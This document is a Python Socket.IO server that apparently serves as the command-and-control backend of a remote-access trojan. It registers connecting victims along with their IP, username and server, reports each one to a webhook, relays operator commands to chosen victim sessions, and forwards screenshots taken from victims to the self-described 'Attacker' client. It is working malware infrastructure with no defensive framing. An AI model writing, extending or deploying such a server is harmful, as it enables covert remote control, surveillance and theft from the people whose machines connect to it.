import eventlet
import socketio
import _webhook
import _data

sio = socketio.Server()
app = socketio.WSGIApp(sio,
                       static_files={
                           '/': {
                               'content_type': 'text/html',
                               'filename': 'index.html'
                           }
                       })

web = _webhook.Weboh()
db = _data.DatabaseX()


def save_sid(sid, ip, username, server, webhook, avatar, footer):
    db.enter_values(sid, ip, username, server, webhook, avatar, footer)


def disconnect_sid(sid):
    db.delete_sid(sid)

@sio.event 
def sending_screenshot(sid, data):
    print(f'{sid} - sending screenshot')
    sio.emit('receiving_screenshot', {'data': data['data']})

@sio.event
def send_command(sid, data):
    dicx = data['data']
    sio.emit('receive_command', {'data': dicx["command"]}, room=dicx["sid"])


@sio.event
def connect(sid, environ):
    print(f'{sid} - connected')


@sio.event
def client_connect(sid, data):
    print("Attacker Connected", data)
    
@sio.event 
def number_connected(sid): #Return the number of connected clients
    number = db.get_sessions() 
    sio.emit("all_sessions", {"data": number}, room=sid)

@sio.event
def rose_connect(sid, rose_data):
    f = rose_data['data']
    web.on_connect(ip=f['ip'],
                   username=f['username'],
                   server=f['server'],
                   webhook=f['webhook'],
                   avatar=f['avatar'],
                   footer=f['footer'],
                   sid=sid)
    save_sid(sid, f['ip'], f['username'], f['server'], f['webhook'],
             f['avatar'], f['footer'])


@sio.event
def disconnect(sid):
    print('disconnect ', sid)
    f = db.get_all(sid)
    if f is None:
        return
    web.on_disconnect(ip=f[1],
                      username=f[2],
                      server=f[3],
                      webhook=f[4],
                      avatar=f[5],
                      footer=f[6],
                      sid=sid)
    disconnect_sid(sid)


if __name__ == '__main__':
    eventlet.wsgi.server(eventlet.listen(('', 5000)), app)
